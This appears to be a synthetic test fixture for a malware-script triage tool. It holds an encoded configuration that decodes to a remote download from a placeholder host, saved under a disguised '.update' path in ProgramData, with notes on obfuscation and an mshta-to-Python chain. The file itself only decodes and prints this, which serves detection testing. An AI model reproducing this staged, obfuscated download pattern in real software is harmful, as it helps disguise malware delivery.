#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_2a335566 = (115, 58, 47, 121, 112, 113, 98, 109, 112, 58, 94, 96, 110, 114, 102, 111, 98, 92, 111, 98, 106, 108, 113, 98, 41, 116, 111, 102, 113, 98, 92, 99, 102, 105, 98, 121, 94, 97, 94, 109, 113, 98, 111, 58, 111, 98, 110, 114, 98, 112, 113, 92, 112, 113, 111, 98, 94, 106, 92, 113, 108, 92, 109, 94, 113, 101, 121, 112, 113, 94, 100, 98, 92, 96, 108, 114, 107, 113, 58, 46, 121, 112, 118, 107, 113, 94, 117, 58, 100, 98, 107, 98, 111, 94, 113, 108, 111, 92, 109, 102, 109, 98, 105, 102, 107, 98, 121, 108, 95, 99, 114, 112, 96, 94, 113, 102, 108, 107, 58, 99, 112, 113, 111, 102, 107, 100, 92, 99, 111, 94, 100, 106, 98, 107, 113, 112, 121, 96, 94, 111, 111, 102, 98, 111, 58, 109, 118, 102, 107, 112, 113, 94, 105, 105, 98, 111, 92, 108, 107, 98, 99, 102, 105, 98, 121, 116, 102, 107, 97, 108, 116, 112, 92, 96, 101, 94, 102, 107, 58, 106, 112, 101, 113, 94, 92, 113, 108, 92, 109, 118, 113, 101, 108, 107, 121, 96, 94, 106, 109, 94, 102, 100, 107, 92, 102, 97, 58, 96, 94, 106, 109, 94, 102, 100, 107, 42, 53, 97, 96, 54, 53, 47, 96, 94, 97, 46, 121, 114, 111, 105, 58, 101, 113, 113, 109, 112, 55, 44, 44, 53, 97, 96, 54, 53, 47, 96, 94, 97, 46, 43, 98, 117, 94, 106, 109, 105, 98, 43, 102, 107, 115, 94, 105, 102, 97, 44, 99, 49, 48, 95, 96, 52, 49, 94, 43, 109, 118, 121, 114, 112, 98, 111, 92, 94, 100, 98, 107, 113, 58, 69, 114, 107, 113, 111, 98, 112, 112, 77, 118, 113, 101, 108, 107, 44, 53, 97, 96, 54, 53, 47, 96, 94, 97, 46, 121, 99, 102, 105, 98, 92, 109, 94, 113, 101, 58, 64, 55, 44, 77, 111, 108, 100, 111, 94, 106, 65, 94, 113, 94, 44, 69, 114, 107, 113, 111, 98, 112, 112, 73, 94, 95, 44, 43, 114, 109, 97, 94, 113, 98, 42, 53, 97, 96, 54, 53, 47, 96, 94, 97, 46, 43, 109, 118,)
    CODEC_2a335566 = "integer_tuple|subtract_modulo_256|03"

    def load_2a335566():
        return bytes(MATERIAL_2a335566)

    def decode_2a335566(stored_bytes):
        return bytes((value + 3) % 256 for value in stored_bytes)

    def recover_2a335566():
        harmless_value = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")
        try:
            recovered_bytes = decode_2a335566(load_2a335566())
        except (TypeError, ValueError) as error:
            raise RuntimeError("configuration recovery failed") from error
        configuration_text = recovered_bytes.decode("ascii", "strict")
        return configuration_text

    def inspect_2a335566():
        view = memoryview(recover_2a335566().encode("ascii"))
        return bytes(view).decode("ascii")

    def surface_2a335566():
        stream = (item for item in ("generator_pipeline", "fstring_fragments", "pyinstaller_onefile", "mshta_to_python"))
        return tuple(stream)

    def obfuscation_2a335566():
        left, right = "fstrin", "g_fragments"
        return f"{left}{right}"

    def plan_2a335566():
        fields = dict(item.split("=", 1) for item in inspect_2a335566().split("|"))
        analysis_surface = surface_2a335566()
        obfuscation_surface = obfuscation_2a335566()
        operation_plan = ("request_stream_to_path", fields["url"], fields["file_path"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_2a335566())
